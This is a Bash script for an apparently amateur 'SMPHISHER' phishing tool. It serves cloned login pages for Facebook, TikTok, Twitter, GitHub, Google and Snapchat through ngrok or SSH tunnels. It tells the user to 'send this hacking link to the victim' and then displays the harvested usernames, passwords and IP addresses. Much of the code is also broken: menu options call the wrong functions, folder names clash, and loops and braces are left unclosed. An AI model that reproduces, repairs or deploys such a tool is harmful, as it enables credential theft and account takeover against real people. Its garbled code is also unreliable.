# Coded : by Prince Gutierrez
# Github : https://github.com/PDGHACK-10
#Version : 1.0.2
#about this tool : SOCIAL MEDIA PHISHING TOOL
#YOUTUBE CHANNEL : PDGHACK-12
blue='\033[31;1m'
red='\033[32;1m'
green='\033[33;1m'
white='\033[34;1m'

dependencies() {

command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v openssh > /dev/null 2>&1 || { echo >&2 "I require openssh but it's not installed. Install it. Aborting."; exit 1; }
 

}

tools() {

figlet SMPHISHER
echo -e $red $=================================$
echo -e $red $    CODED BY PRINCE GUTIERREZ    $
echo -e $red $=================================$
echo -e $red ==================================
echo -e $red % "[01]    FACEBOOK"              %
echo -e $red % "[02]    TIKTOK"                %
echo -e $red % "[03]    TWITTER"               %
echo -e $red % "[04]    GITHUB"                %
echo -e $red % "[05]    GOOGLE"                %
echo -e $red % "[06]    SNAPCHAT"               %
echo -e $red ==================================                              
read -p $red "ENTER SOCIAL MEDIA TO HACK " hug

if [[ $hug == 1 || $hug == 01 ]]; then
website="facebook"
tunnel_menu

elif [[ $hug == 2 || $hug == 02 ]]; then
website="tiktok"
tunnel_menu

elif [[ $hug == 3 || $hug == 03 ]]; then
website="twitter"
tunnel_menu

elif [[ $hug == 4 || $hug == 04 ]]; then
website="github"
tunnel_menu

elif [[ $hug == 5 || $hug == 05 ]]; then
website="google"
tunnel_menu

elif [[ $hug == 6 || $hug == 06 ]]; then
website="snapchat"
tunnel_menu
fi

}



tunnel_menu() {

if [[ -e .splink ]]; then
rm -rf .splink
fi

if [[ -d .pdg/www ]]; then
rm -rf .pdg/www
mkdir .pdg/www
else
mkdir .pdg/www
fi

cp -rf .cd $HOME/SMPHISHER/sites/$website/* .pdg/www
cp -f .sites/ip.php .pdg/www/

def_tunnel_menu="2"
smallbanner
echo -e $red "01 > Ngrok"
echo -e $red "02 > Serveo"
echo -e $red "03 > LocalHostRun (NOT WORKING)"
echo
read -p "Select Option : " tunnel_menu

if [[ $tunnel_menu == 1 || $tunnel_menu == 01 ]]; then
start_localhost
elif [[ $tunnel_menu == 2 || $tunnel_menu == 02 ]]; then
start_ngrok
elif [[ $tunnel_menu == 3 || $tunnel_menu == 03 ]]; then
start_serveo
elif [[ $tunnel_menu == 4 || $tunnel_menu == 04 ]]; then
start_loclx
elif [[ $tunnel_menu == 5 || $tunnel_menu == 05 ]]; then
start_localhostrun

else
echo -e $blue INVALID OPTION TRY AGAIN...
sleep 5
tools
fi

}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
echo -e $red              ███╗░░██╗░██████╗░██████╗░░█████╗░██╗░░██╗
echo -e $red              ████╗░██║██╔════╝░██╔══██╗██╔══██╗██║░██╔╝
echo -e $red              ██╔██╗██║██║░░██╗░██████╔╝██║░░██║█████═╝░
echo -e $red              ██║╚████║██║░░╚██╗██╔══██╗██║░░██║██╔═██╗░
echo -e $red              ██║░╚███║╚██████╔╝██║░░██║╚█████╔╝██║░╚██╗
echo -e $red              ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝ v11.0
echo -e $red              DOWNLOADING NGROK  PLEASE WAIT**************
                                
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

start_ngrok() {

echo -e $red Reading now... http://127.0.0.1:9727
sleep 2
echo -e $red Ngrok Launching Up ...
cd .pd/www && php -S http://127.0.0.1:9727 > /dev/null 2>&1 & 
sleep 2
./.pd/ngrok http http://127.0.0.1:9727 > /dev/null 2>&1 &
sleep 7
ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")

figlet SMPHISHER
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% SEND THIS HACKING LINK TO THE VICTIM👇👇👇👇👇 % 
% LINKeoolo $ngrok_link                               %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%



}

start_serveo() {

serveo_default_choose_sub="Y"
serveo_default_sub="$website$RANDOM"
serveo_def_port="5555"

echo -e $red Select a Port $red Default : $serveo_def_port
read serveo_port
serveo_port="${serveo_port:-${serveo_def_port}}"
sleep 1
echo -e $red Generate Custom Link ? Y :
read serveo_choose_sub
serveo_choose_sub="${serveo_choose_sub:-${serveo_default_choose_sub}}"
if [[ $serveo_choose_sub == "Y" || $serveo_choose_sub == "y" || $serveo_choose_sub == "Yes" || $serveo_choose_sub == "yes" ]]; then
serveo_custom_subdomain=true
sleep 1
echo -e $red Input CUSTOM Subdomain : $redDefault: $red: $serveo_default_sub
read serveo_subdomain
serveo_subdomain="${serveo_subdomain:-${serveo_default_sub}}"
sleep 1
fi

echo -e $res Starting.....http://127.0.0.1:$serveo_port
sleep 1
echo -e $red Launching Up Serveo ...
cd pd/www && php -S 127.0.0.1:$serveo_port > /dev/null 2>&1 & 
if [[ $serveo_custom_subdomain == true ]]; then
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_subdomain,$serveo_port
sleep 7

else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_port
sleep 7
fi
serveo_link=$(grep -o '.\{0,0\}http.\{0,100\}' sp)
figlet SMPHISHER
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% SEND THIS HACKING LINK TO THE VICTIM👇👇👇👇👇 % 
% LINK $serveo_link                              %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%



}

start_localhostrun() {

echo -e $red Launching Up LocalHostRun ...
cd .pdg/www && php -S 127.0.0.1:9727 > /dev/null 2>&1 & 
echo -e $red Reading now...http://127.0.0.1:9727
sleep 1
echo -e $red Press Ctrl+C to View Login Creds 
sleep 1
ssh -R 80:localhost:9727 ssh.localhost.run

echo ""

echo
echo -e $red Login Information
echo
while [ true ]; do



echo -e $red Victim IP Found

account=$(grep -o 'Username:.*') 
IFS=$'\n'
password=$(grep -o 'Pass:.*') 
echo -e $ red "Account : $account"
echo -e $ red "Password: $password"
echo -e $ red "Press Ctrl + C to Exit"

}

install_ngrok() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok... [Please Wait... ]\n"
                                
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

}


dependencies
ngrok_server
tools
stop
